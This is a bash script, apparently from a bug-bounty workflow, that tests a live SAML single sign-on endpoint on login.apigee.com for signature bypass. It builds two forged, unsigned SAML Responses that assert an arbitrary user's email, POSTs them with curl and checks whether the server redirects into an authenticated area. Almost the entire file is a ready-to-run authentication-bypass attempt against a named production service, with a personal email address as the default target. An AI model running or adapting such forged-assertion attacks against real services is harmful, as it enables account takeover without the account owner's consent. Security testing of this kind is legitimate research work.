#!/bin/bash
# Test SAML SSO endpoint for signature bypass
# Target: https://login.apigee.com/saml/SSO/alias/apigee-saml-login
# The /saml/metadata confirms SAML SSO is ACTIVE. This tests whether the
# ACS endpoint validates IDP assertion signatures before logging the user in.
# Run on Pi. No auth required.
export PATH="/usr/bin:/usr/local/bin:/usr/sbin:/bin:$PATH"

OUTDIR="$HOME/bug-bounty-hunting-/results/apigee/03-candidates"
mkdir -p "$OUTDIR"
OUT="$OUTDIR/APG-L005-saml-sso-bypass.txt"

TARGET_EMAIL="${1:-zahinshahriar3@gmail.com}"
ACS="https://login.apigee.com/saml/SSO/alias/apigee-saml-login"
ENTITY_ID="apigee-saml-login"
NOW=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
FUTURE=$(date -u -d "+1 hour" +"%Y-%m-%dT%H:%M:%SZ" 2>/dev/null || date -u -v+1H +"%Y-%m-%dT%H:%M:%SZ")

echo "=== SAML SSO Endpoint Signature Bypass Test ===" | tee "$OUT"
echo "Date: $(date -u)" | tee -a "$OUT"
echo "ACS: $ACS" | tee -a "$OUT"
echo "Target email: $TARGET_EMAIL" | tee -a "$OUT"
echo | tee -a "$OUT"

# Build a minimal unsigned SAML Response (NOT just assertion — full Response wrapper)
SAML_RESPONSE=$(cat <<SAML
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="response_test_$(date +%s)"
    Version="2.0"
    IssueInstant="${NOW}"
    Destination="${ACS}"
    InResponseTo="_test">
  <saml:Issuer>https://attacker-test.invalid/saml</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion Version="2.0" ID="assertion_test_$(date +%s)" IssueInstant="${NOW}">
    <saml:Issuer>https://attacker-test.invalid/saml</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">${TARGET_EMAIL}</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData
          Recipient="${ACS}"
          NotOnOrAfter="${FUTURE}"
          InResponseTo="_test"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="${NOW}" NotOnOrAfter="${FUTURE}">
      <saml:AudienceRestriction>
        <saml:Audience>${ENTITY_ID}</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="${NOW}" SessionIndex="_session123">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
    <saml:AttributeStatement>
      <saml:Attribute Name="email">
        <saml:AttributeValue>${TARGET_EMAIL}</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
SAML
)

SAML_B64=$(echo "$SAML_RESPONSE" | base64 -w 0)

echo "=== Test 1: POST unsigned SAML Response (no InResponseTo match) ===" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 15 \
  -X POST "$ACS" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
  -D /tmp/saml_sso1_headers.txt \
  -o /tmp/saml_sso1_body.txt \
  -d "SAMLResponse=${SAML_B64}&RelayState=/"
echo "--- Response headers ---" | tee -a "$OUT"
/usr/bin/cat /tmp/saml_sso1_headers.txt | tee -a "$OUT"
echo "--- Body key indicators ---" | tee -a "$OUT"
/usr/bin/grep -ioE "(error|invalid|signature|authentication|success|unauthorized|session)[^<\"]{0,100}" \
  /tmp/saml_sso1_body.txt | /usr/bin/head -10 | tee -a "$OUT"
echo | tee -a "$OUT"

# Build a SAML Response where Issuer matches the known registered SP EntityID
# (some servers only check if the Issuer is in the known list, not the signature)
SAML_RESPONSE2=$(cat <<SAML
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="response_test2_$(date +%s)"
    Version="2.0"
    IssueInstant="${NOW}"
    Destination="${ACS}">
  <saml:Issuer>${ENTITY_ID}</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion Version="2.0" ID="assertion_test2_$(date +%s)" IssueInstant="${NOW}">
    <saml:Issuer>${ENTITY_ID}</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">${TARGET_EMAIL}</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData
          Recipient="${ACS}"
          NotOnOrAfter="${FUTURE}"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="${NOW}" NotOnOrAfter="${FUTURE}">
      <saml:AudienceRestriction>
        <saml:Audience>${ENTITY_ID}</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="${NOW}">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
  </saml:Assertion>
</samlp:Response>
SAML
)

SAML_B64_2=$(echo "$SAML_RESPONSE2" | base64 -w 0)

echo "=== Test 2: POST unsigned SAML Response (Issuer=entity ID, no InResponseTo) ===" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 15 \
  -X POST "$ACS" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
  -D /tmp/saml_sso2_headers.txt \
  -o /tmp/saml_sso2_body.txt \
  -d "SAMLResponse=${SAML_B64_2}&RelayState=/"
echo "--- Response headers ---" | tee -a "$OUT"
/usr/bin/cat /tmp/saml_sso2_headers.txt | tee -a "$OUT"
echo "--- Body key indicators ---" | tee -a "$OUT"
/usr/bin/grep -ioE "(error|invalid|signature|authentication|success|unauthorized|session|no.registered.idp)[^<\"]{0,100}" \
  /tmp/saml_sso2_body.txt | /usr/bin/head -10 | tee -a "$OUT"
echo | tee -a "$OUT"

echo "=== INTERPRETATION ===" | tee -a "$OUT"
LOC1=$(/usr/bin/grep -i "^Location:" /tmp/saml_sso1_headers.txt | head -1)
LOC2=$(/usr/bin/grep -i "^Location:" /tmp/saml_sso2_headers.txt | head -1)
echo "Test 1 Location: $LOC1" | tee -a "$OUT"
echo "Test 2 Location: $LOC2" | tee -a "$OUT"
echo | tee -a "$OUT"

if echo "$LOC1$LOC2" | /usr/bin/grep -qi "edge\|dashboard\|home\|authorized"; then
  echo "*** POTENTIAL CRITICAL: SSO redirected to authenticated area! ***" | tee -a "$OUT"
  echo "*** Signature bypass may be confirmed — investigate immediately ***" | tee -a "$OUT"
elif /usr/bin/grep -qi "no.registered.idp\|invalid.*issuer\|no.idp" /tmp/saml_sso1_body.txt /tmp/saml_sso2_body.txt 2>/dev/null; then
  echo "No registered IDP for that Issuer — server validates Issuer registration." | tee -a "$OUT"
  echo "Next: check /identity-providers for registered IDPs (needs admin auth)." | tee -a "$OUT"
elif /usr/bin/grep -qi "signature" /tmp/saml_sso1_body.txt /tmp/saml_sso2_body.txt 2>/dev/null; then
  echo "Signature validation error — server IS checking signatures. CVE not applicable." | tee -a "$OUT"
else
  echo "Unclear — inspect body files manually." | tee -a "$OUT"
  /usr/bin/head -c 500 /tmp/saml_sso1_body.txt | tee -a "$OUT"
fi

echo
echo "Done. Results: $OUT"
